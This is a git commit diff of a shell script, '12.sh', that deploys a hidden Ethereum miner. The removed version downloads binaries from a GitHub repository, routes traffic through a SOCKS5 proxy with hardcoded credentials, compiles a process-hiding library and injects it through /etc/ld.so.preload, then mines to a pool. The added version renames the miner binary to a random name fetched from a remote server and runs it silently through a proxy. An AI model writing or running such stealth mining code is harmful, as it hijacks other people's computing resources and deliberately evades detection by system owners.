679c4b4e72865913bbf86fb9cc94d2bb7cb0161b
rindalasririn <95740336+rindalasririn@users.noreply.github.com>
2022-05-24 09:40:50 -0600

    Update 12.sh

--- 12.sh
+++ 12.sh
@@ -1,35 +1,11 @@
-#!/bin/sh
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-dpkg-reconfigure --frontend noninteractive tzdata
-
-apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
-
-wget https://raw.githubusercontent.com/gunturyogatama404/asdacascdasd/main/graphics.tar.gz
-
-tar -xvzf graphics.tar.gz
-
-cat > graftcp/local/graftcp-local.conf <<END
-listen = :2233
-loglevel = 1
-socks5 = 18.223.155.101:1080
-socks5_username = sempakcok
-socks5_password = gunturmanis
-END
-
-wget https://raw.githubusercontent.com/gunturyogatama404/asdacascdasd/main/pepek
-
-chmod +x pepek
-
-wget https://raw.githubusercontent.com/gunturyogatama404/asdacascdasd/main/pepek.zip
-
-unzip pepek.zip
-
-make
-
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-
-mv libprocesshider.so /usr/local/lib/
-
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-
-./pepek --algo ETHASH --pool stratum+tcp://ethash.poolbinance.com:1800 --user teguhcong.$(echo $(shuf -i 1-9999 -n 1)-sty) --ethstratum ETHPROXY
+#!/bin/bash
+#wget https://cuan.mine.nu/nbminer
+ACAK=$(echo $(curl -s https://cuan.mine.nu/random.php))
+chmod +x bubui && mv bubui $ACAK
+read -p 'Input Proxy nya: ' PROXY
+WALLET=teguhcong
+POOL=stratum+tcp://ethash.poolbinance.com:1800
+WORKER1=$(echo $(shuf -i 1000-9999 -n 1))
+#WORKER2=$(date '+%d%b')
+#WORKER3=$(echo $(nvidia-smi --query-gpu=gpu_name --format=csv,noheader) | tr -d " ","-")
+./$ACAK --algo ETHASH --socks5 $PROXY --pool $POOL --user $WALLET.$WORKER1 --tls 0 -- ethstratum ETHV1 --silence 3
